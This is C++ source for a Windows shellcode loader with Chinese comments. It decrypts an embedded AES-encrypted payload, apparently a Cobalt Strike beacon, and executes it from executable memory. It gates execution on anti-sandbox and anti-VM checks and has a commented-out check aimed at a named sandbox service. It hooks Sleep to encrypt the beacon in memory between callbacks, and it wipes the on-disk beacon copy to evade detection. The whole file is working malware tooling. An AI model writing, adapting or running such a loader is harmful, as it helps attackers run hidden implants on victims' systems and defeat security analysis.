#include<windows.h>
#include "AES.h"
#include<detours.h>
#include<iostream>
#include <stdio.h>
#include <stdlib.h>
#include <regex>


#ifdef _WIN64
#pragma comment(lib,"detours_x64.lib")
#else
#pragma comment(lib,"detours_x86.lib")
#endif

typedef LPVOID(*MySleep)(DWORD dwMilliseconds);

// 定义内存页属性结构体
typedef struct {
	LPVOID address;		// 内存地址
	DWORD size;			// 内存大小
}MemoryAttrib;

// 定义内存信息结构体
typedef struct {
	MemoryAttrib memoryPage[3];	// 能找到符合条件的目标内存最多3个
	int index;					// 内存下标
	unsigned char * key;		// 加解密key
	BOOL isScanMemory;			// 是否已查找内存页信息
	BOOL iscleaned;				//是否清除之前的beacon和shellcode遗留
	LPVOID shellcodeaddress;	//shellcode起始位置
	int shellcodesize;			//shellcode大小
}MemoryInfo;

MemoryInfo memoryInfo;
// 查找内存页


static LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;
LPVOID WINAPI My_VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    LPVOID address = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
    printf("开辟了空间地址： %p\n", address);
    return address;
}

/*
	beacon 运行时已经可以清除内存的其他痕迹了
*/
void DeleteOther() {
	//这里发现一个问题，memoryscan之后，beacon的地址不一定是在filebeacon之后，但是大小存在差异（拉伸后的size小于file的size）;
//所以这比较一下最后两个页，size小的为拉伸后的beacon，也就是需要加密的，size大的为文件beacon 直接初始化并修改内存属性为rw；
	MemoryAttrib beacon_1 = memoryInfo.memoryPage[memoryInfo.index - 2];
	MemoryAttrib beacon_2 = memoryInfo.memoryPage[memoryInfo.index - 1];
	//printf("beacon1.size : %d\n", beacon_1.size);
	//printf("beacon2.size : %d\n", beacon_2.size);
	if (beacon_2.size > beacon_1.size) {
		//printf("发生交换\n");
		MemoryAttrib beacon_3 = beacon_2;
		memoryInfo.memoryPage[memoryInfo.index - 1] = memoryInfo.memoryPage[memoryInfo.index - 2];
		memoryInfo.memoryPage[memoryInfo.index - 2] = beacon_3;
	}


	printf("FileBeacon Address at 0x%p\n", memoryInfo.memoryPage[memoryInfo.index - 2].address);
	printf("Beacon Address at 0x%p\n", memoryInfo.memoryPage[memoryInfo.index - 1].address);


	MemoryAttrib Beacon_org = memoryInfo.memoryPage[memoryInfo.index - 2];
	DWORD org_bufSize = Beacon_org.size;
	RtlSecureZeroMemory(Beacon_org.address, org_bufSize); // 文件形式的beacon消除
	DWORD oldProt;
	VirtualProtect(Beacon_org.address, Beacon_org.size, PAGE_READWRITE, &oldProt);// 修改内存属性
	printf("文件形式beacon已清除 \n");
	
	//RtlSecureZeroMemory(memoryInfo.shellcodeaddress,memoryInfo.shellcodesize ); // 残留的shellcode消除
	printf("shellcode 地址：%x\n", memoryInfo.shellcodeaddress);
	memoryInfo.iscleaned = TRUE;


}

void ScanMemoryMap()
{
	// 内存块信息结构体
	MEMORY_BASIC_INFORMATION mbi;

	LPVOID lpAddress = 0;
	HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, GetCurrentProcessId());

	int* index = &memoryInfo.index;

	while (VirtualQueryEx(hProcess, lpAddress, &mbi, sizeof(mbi)))
	{
		// 查找可读可写可执行内存页
		if (mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE && mbi.Type == MEM_PRIVATE)
		{

			// 保存内存信息
			memoryInfo.memoryPage[*index].address = mbi.BaseAddress;
			memoryInfo.memoryPage[*index].size = (DWORD)mbi.RegionSize;
			printf("BaseAddr = %p\n", memoryInfo.memoryPage[*index].address);
			(*index)++;

			if ((*index) >= 3)
				break;
		}
		// 更新到下一个内存页
		lpAddress = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
	}

	// 更新为已扫描内存
	memoryInfo.isScanMemory = TRUE;

	// 释放shellcode内存页
	VirtualFree(memoryInfo.memoryPage[0].address, 0, MEM_RELEASE);
}
void AESEncode(unsigned char * plain,int plain_size) {
	if (plain_size % 16 != 0) {
		plain_size = plain_size + (16 - (plain_size % 16));
	}
	unsigned char iv[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
	//unsigned char key[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f }; //key example
	AES aes(AESKeyLength::AES_128);
	unsigned char* cipher = aes.EncryptCBC(plain, plain_size, memoryInfo.key, iv);   //cbc
	memcpy(plain, cipher, plain_size);	//使用加密后的形式覆盖原理的被拉伸的beacon
	//printf("密文:");
	//for (int i = 0; i < plain_size; i++) {
	//	printf("\\x%02x", cipher[i]);
	//}
	//printf("\n");
}

void AESDecode(unsigned char* cipher, int cipher_size) {
	
	unsigned char iv[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
	//unsigned char key[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f }; 
	AES aes(AESKeyLength::AES_128);

	unsigned char* res_plain = aes.DecryptCBC(cipher, cipher_size, memoryInfo.key, iv);	//解密
	memcpy(cipher, res_plain, cipher_size);
	//printf("密文:");
	//for (int i = 0; i < plain_size; i++) {
	//	printf("\\x%02x", cipher[i]);
	//}
	//printf("\n");
}




// 加解密Beacon
void My_Encrypt()
{
	// 定位到真正的Beacon内存页
	MemoryAttrib Beacon = memoryInfo.memoryPage[memoryInfo.index - 1];


	DWORD bufSize = Beacon.size;

	unsigned char* buffer = (unsigned char*)(Beacon.address);
	int bufSizeRounded = (bufSize - (bufSize % sizeof(unsigned int)));


	
	//AESEncode(buffer,Bufsize);//加密拉伸后的beacon
	AESEncode(buffer, bufSizeRounded);//加密拉伸后的beacon

	DWORD oldProt;

	// 将内存页设置为可读可写
	VirtualProtect(Beacon.address, Beacon.size, PAGE_READWRITE, &oldProt);
	printf("Beacon已加密并将内存页属性调整为 RW.\n");
}

void My_Decrypt()
{
	// 定位到真正的Beacon内存页
	MemoryAttrib Beacon = memoryInfo.memoryPage[memoryInfo.index - 1];
	DWORD bufSize = Beacon.size;
	unsigned char* buffer = (unsigned char*)(Beacon.address);
	int bufSizeRounded = (bufSize - (bufSize % sizeof(unsigned int)));
	//int bufsize = bufSize % sizeof(unsigned int);

	// 对Beacon进行加密或解密
	//for (int i = 0; i < bufSizeRounded; i++)
	//{
	//	buffer[i] ^= memoryInfo.key;	// 简单的异或加解密
	//}
	AESDecode(buffer, bufSizeRounded);
	//AESDecode(buffer,bufsize);

	DWORD oldProt;


		// 将内存页设置为可读可写可执行
	VirtualProtect(Beacon.address, Beacon.size, PAGE_EXECUTE_READWRITE, &oldProt);
	printf("Beacon已解密并内存页属性调整为 RWX.\n");
}


static void(WINAPI* OldSleep)(DWORD dwMilliseconds) = Sleep;
void WINAPI My_Sleep(DWORD dwMilliseconds) {
    printf("调用sleep，休眠时间：%d\n", dwMilliseconds);
    //printf("oldsleep，地址是：0x%x\n", OldSleep);
	if (!memoryInfo.isScanMemory)	//扫描的动作只用发生一次
		ScanMemoryMap();


	if (!memoryInfo.iscleaned)	//清除动作只发生一次
		DeleteOther();
	My_Encrypt();
	OldSleep(dwMilliseconds);
	My_Decrypt();


}

void hookfun() {
    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)OldSleep, My_Sleep);
    //DetourAttach(&(PVOID&)OldVirtualAlloc, My_VirtualAlloc);
    if (0 == DetourTransactionCommit())
    {
        printf("hooked succeed\n");
    }
    else
    {
        printf("hook failed\n");
    }

}
void unhookfun() {
    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourDetach(&(PVOID&)OldSleep, My_Sleep);
    //DetourDetach(&(PVOID&)OldVirtualAlloc, My_VirtualAlloc);
    if (0 == DetourTransactionCommit())
    {
        printf("unhooked succeed\n");
    }
    else
    {
        printf("unhook failed\n");
    }

}


// 初始化内存页信息
void InitMemoryInfo(LPVOID shellcodeaddress, int size)
{
	memoryInfo.index = 0;
	memoryInfo.isScanMemory = FALSE;
	unsigned char keys[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
	memoryInfo.key = keys;	
	memoryInfo.iscleaned = FALSE;
	memoryInfo.shellcodeaddress = shellcodeaddress;
	memoryInfo.shellcodesize = size;

}


/*
	check cpu
	反沙箱、虚拟机 分配的cpu个数
*/
bool checkcpu() {
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	if (numberOfProcessors < 2)
		return false;
	else
		return true;
}
/*
		// check RAM
		内存大于2g
*/
bool checkRAM() {

	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAMMB < 2048)
		return false;
	else
		return true;
}
/*
	反虚拟机、沙箱
	硬盘大小大于100
*/
bool checkHDD() {

	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 100)
		return false;
	else
		return true;
}
/*
	反沙箱、虚拟机,开机时间大于1小时返回true
*/
bool checkUptime() {
	DWORD upTime = GetTickCount();
	//printf("时间：%d", &upTime);
	if (upTime > 3600000)
		return true;
	else
		return false;
}
/*
	反沙箱、虚拟机
	检测时间是否加速，来绕过沙箱
	返回false  没问题
	返回true  检测到沙箱
*/
BOOL accelerated_sleep()
{
	DWORD dwStart = 0, dwEnd = 0, dwDiff = 0;
	DWORD dwMillisecondsToSleep = 30 * 1000;

	dwStart = GetTickCount();
	MySleep mySlp = (MySleep)GetProcAddress(GetModuleHandle("Kernel32.dll"), "Sleep");
	mySlp(dwMillisecondsToSleep);
	dwEnd = GetTickCount();

	dwDiff = dwEnd - dwStart;
	if (dwDiff > dwMillisecondsToSleep - 1000) // substracted 1s just to be sure
		return false;
	else
		return true;
}

/*
	反沙箱、虚拟化
	检查文件名(有些沙箱会改名去运行)
	文件运行的路径（这个要配合样本本身来做，样本要把自己复制到特定的文件夹下面，然后创建进程启动目标文件夹下的样本，结束自己；
	之前遇到过一个样本：1、先把自己复制到特定文件夹；2、释放一个bat文件 3、运行bat文件，bat文件运行复制之后的样本）
*/
bool checkprocessnameandpath() {
	char currentProcessPath[MAX_PATH + 1];
	GetModuleFileName(NULL, currentProcessPath, MAX_PATH + 1);
	//if (!wcsstr(currentProcessPath, L"C:\\USERS\\PUBLIC\\")) return false;
	if (!strstr(currentProcessPath, "My_RandomEncrypt.exe"))
	{
		return false;
	}
	else
		return true;
}
/*
	反沙箱 虚拟化
	检查usb链接的个数
*/
bool checkusbnum() {
	HKEY hKey;
	DWORD mountedUSBDevicesCount;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey);
	RegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (mountedUSBDevicesCount < 1)
		return false;
	else
		return true;

}
/*
	对抗微步
*/

//bool checkWEIBU() {
//	char currentProcessPath[MAX_PATH + 1];
//	GetModuleFileName(NULL, currentProcessPath, MAX_PATH + 1);
//	std::string input(currentProcessPath);
//	std::regex pattern(R"(C:\\[A-Za-z]{7}\\My_RandomEncrypt\.exe)");
//	std::smatch matches;
//
//	if (std::regex_search(input, matches, pattern)) {
//		//printf("匹配正则！ 当前路径是：%s", currentProcessPath);
//		//std::cout << "当前路径：" << input << std::endl;
//		return false;
//	}
//	else {
//		//printf("没有匹配正则！ 当前路径是：%s", currentProcessPath);
//		//std::cout << "当前路径：" << input << std::endl;
//		return true;
//	}
//}


int main() {

	unsigned char cipher[] = "\x2f\x6a\x46\xaf\x6f\xdb\x49\xea\x54\x7c\x94\x4c\x43\x18\xf6\xab\x59\x1e\xd9\x67\x83\x99\x7f\x25\x36\x57\xa8\xbc\x30\x0e\xa9\x2d\x91\x68\x27\x60\x64\xa7\xd7\x47\xc2\xc6\x04\xd3\x85\xf5\x71\x52\x6c\x0a\xbf\x77\x80\x53\x53\x48\x30\x95\x53\x50\x43\x7c\xd8\x4d\xad\xc4\x66\x06\xca\xc0\x90\x87\x7f\x9a\x31\x01\x37\xa1\xb0\x1c\x8c\x14\x50\xbb\x99\x2f\xd6\x4f\xd9\x34\x62\x79\x79\x18\x76\x13\x25\xaa\x97\x2d\x99\x5c\x5e\xb8\xae\xa5\x7a\xe5\xa4\xff\xc6\x8f\xda\x03\x98\xb9\xe2\xbc\x73\x32\xc1\x29\xcb\x39\x60\x47\x18\x87\x8c\x7d\x74\xde\xec\xc1\x05\xbc\x42\x05\x44\xad\xd4\xba\x7d\xc8\xcc\x17\xc4\x69\x08\x55\x4e\xe1\x0e\x2c\x37\x70\x81\x33\xb8\x73\xa2\x15\x98\x86\x66\xca\x40\xcb\x7b\xc4\x3c\x87\x36\x84\x02\xd1\x28\xd4\xde\xad\xa6\xeb\x25\xeb\xb0\x26\xbb\x70\xaf\x24\x8a\x67\x3d\x91\x37\x93\xe6\xc6\xfe\xda\xef\x9b\x14\x88\xa6\xe8\xd2\xf7\xfa\x7c\x5c\xa8\x80\x23\x70\xd9\x9f\xad\x12\x6a\x6f\xcd\x5f\x0b\x1c\xe5\x84\xf8\xac\xdb\x56\x73\x6e\x8d\x08\x81\xbd\xa9\xf6\xd5\xa2\xeb\x39\x23\x4b\x32\xd6\x0d\xde\xbb\xdb\xba\x32\xcd\x9c\x99\xa5\xe9\x3c\x92\xe2\x5f\xcf\x8f\xc0\x8b\xa4\xf2\x39\xc8\x05\x14\x5a\x55\x5b\x49\x5b\x90\x3c\x27\xf2\x96\x3d\xbb\x65\x46\x93\x40\x35\x90\x66\x5f\xae\x18\x84\x61\x94\xb2\x4e\xae\xa7\x16\xad\x5a\xf9\xe0\x2d\x21\xf1\x1b\x5c\xe8\x7b\x59\x40\xfa\x3e\x6d\x1b\x65\x1e\x50\xa5\x77\xad\xb0\x12\x8a\xbb\x3f\xac\xcb\x7a\x3d\x08\xdb\x55\x54\xd4\x8c\xbf\x3f\xab\xca\x7b\x01\x70\x44\x70\x6f\x35\x3a\xdb\xd2\x17\xf3\xed\x4a\x9b\xd6\x58\x5e\x78\xf4\xfd\xe2\x71\xa8\xd9\x59\x84\x01\x65\x67\x89\x1e\x60\x91\x93\x8e\x59\x22\xf9\x84\x13\xc8\x79\xb5\xee\x63\x99\x2d\x4a\xe2\xd9\x3f\xde\x74\xff\xee\x8d\x4f\x61\x21\x23\x2f\x17\x66\x8d\x76\xfb\x72\x91\x9b\xcc\x66\x70\x2a\x92\x18\x4f\x27\x27\x32\x0e\x85\xb6\x73\xfd\x29\x8f\x3b\xe7\x4d\x57\xa2\x12\xf0\x60\x77\x50\x28\x30\x59\xf8\x93\x90\xca\x9b\x26\x8e\xc9\x2b\x02\x01\x0c\xff\x34\x80\x26\xb3\x87\xd6\x51\x8d\xbc\xcb\xa4\x0c\x4f\x85\x7d\x60\x5f\xb6\x80\xbb\x46\x7e\x2b\x84\x82\x0c\x2d\xe5\xca\xc4\x33\x97\x96\x93\xf2\x31\x00\x0d\x98\x7c\x84\xc7\x4b\x46\xe4\x64\x68\xba\xee\x31\x8a\x10\xdb\x23\x1c\x9a\x45\xf2\xb4\x66\xaa\x28\xd2\xcb\xab\xa7\xf2\x7b\xd4\xa9\x37\x8e\xf2\xd3\x49\x18\xe1\x3b\xdc\xe3\xf8\xab\xe4\x9b\x5f\x29\xa9\x24\x46\x43\x7d\x97\x3c\x2c\x2c\xb3\x73\xcf\x6b\xce\xc9\xad\xe5\xbc\x1a\x59\x55\xcc\x41\x57\x8a\xcb\xba\x30\x5c\x65\x03\x6d\xe4\x87\x9e\x5e\x66\x8e\x5f\x7b\xcc\xba\xbb\xf2\x4d\xd1\x53\xab\x47\xcc\xb0\xd1\x07\x6d\x6f\x97\xd3\x17\xdf\x7b\xe4\xf8\x32\x73\xe0\x3a\xa6\x28\xe2\xa7\x69\xd7\x7b\x46\x8a\xa8\xdb\x43\x20\x80\xa4\x43\x92\xef\x9a\xe1\x4d\xd3\x73\xe1\xd2\x20\xa9\xc6\xe6\x05\xb1\x16\xf2\xba\x05\x2a\x7e\x7e\x71\x17\xd0\xb7\xfc\x3e\x58\x69\xfa\xfc\x45\xd5\xdc\xdb\x62\xd5\xfc\x25\xaa\xba\xd1\x2a\xa8\xc0\xe7\x13\xdb\xc0\xd5\x2d\xfa\xc5\x99\x39\x63\x42\x66\xde\xa6\xcc\x5d\x99\x4c\x35\xa5\x80\xd1\xad\x16\x86\x89\xef\x1c\xa5\xa8\x02\x4d\x47\x10\xfd\xdb\xd6\x29\xd2\x4c\x32\xa4\x9e\xca\x73\x82\x56\x49\x26\x1c\x75\x94\x1b\x25\xc2\x07\x37\xaa\x15\xee\xbd\xa6\x80\x1b\xd5\x43\x4c\x22\x42\x7f\x5f\x6c\x53\x74\xdc\xb7\x9f\x2f\x94\x09\x12\x1e\x99\xdd\xe6\x82\x4e\x5f\xf6\x97\xcb\xd7\x29\x8d\xaf\xce\x45\x21\xac\xc9\x07\x66\xab\x9b\xb4\x0a\xbd\x91\x67\x1b\x81\xe4\xd7\x4b\xcd\x11\xf3\xe4\x4a\xa6\x27\x49\x5a\xbc\xa6\x3c\x4f\x6e\x00\xaf\x68\xae\xe7\x8e\x55\x79\xe8\xee\x1d\x0e\xc2\x0c\x0d\xb6\xce\xfe\x37\xc6\x34\xa3\xe9\x0c\x36\x2a\x1f\x4f\xba\x18\x79\xbf\x25\x54\x6c\xaf\x8a\x8c\x1b\x1e\xff\xd6\xdc\xd4\xaf\x70\xbd\xce\x84\x0a\x2a\x5a\xfb\xfe\xf2\x0c\xb2\xf1\xe9\x8d\xdd\x23\x06\x42\x6a\x5a\xce\x01\x47\xd4\x1c\x0e\xdd\x8b\x6d\xff\x69\x3c\x72\x0e\xb8\x8b\x73\x99\xa6\x8e\x85\x8f\xc5\x10\xea\x85\xc9\x09\xe9\xb0\x07\x6b\xc7\x78\xc8\xf0\xe2\x80\xac\x14\x34\xae\xda\x16\xb6\xac\x99\x25\x46\xdf\x5e\x63\xfb\x92\x49\x10\xda\x18\x1c\x7e\x04\xee\x08\xad\x0a\xa2\xb6\x14\xc9\x82\xd1\x78\x6d\x7e\xa5\x48\xf6\x76";

	AES aes(AESKeyLength::AES_128);
	unsigned char iv[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
	unsigned char key[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f }; 
	int cipher_size = sizeof(cipher) / sizeof(cipher[0]) - 1;



	//
	if (accelerated_sleep() == false) {
		//if (checkUptime() == true) {	//反虚拟机 开机时间大于1小时
			if (checkcpu() == true) {	//反虚拟机 cpu>2
				if (checkRAM() == true) {
					if (checkprocessnameandpath() == true) {
						//if (checkHDD() == true) {
						//if (checkWEIBU() == true) {
							unsigned char* buf = aes.DecryptCBC(cipher, cipher_size, key, iv);	//解密
							hookfun();
							LPVOID mem = VirtualAlloc(NULL, cipher_size+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
							printf("shellcode的真实地址：%x", mem);
							memcpy(mem, buf,cipher_size);
							InitMemoryInfo(mem, cipher_size);
							((void(*)())mem)();
							return 0;
					}
					else
					{
						printf(" sleep 被加速");
					}
				}else {
					printf(" ARM大小有问题");
				}
			}else {
				printf(" cpu个数小于2");
			}
		//}else {
		//	printf(" 开机时间小于1小时");
		//}
	}else {
		printf(" sleep 被加速");
	}
	

}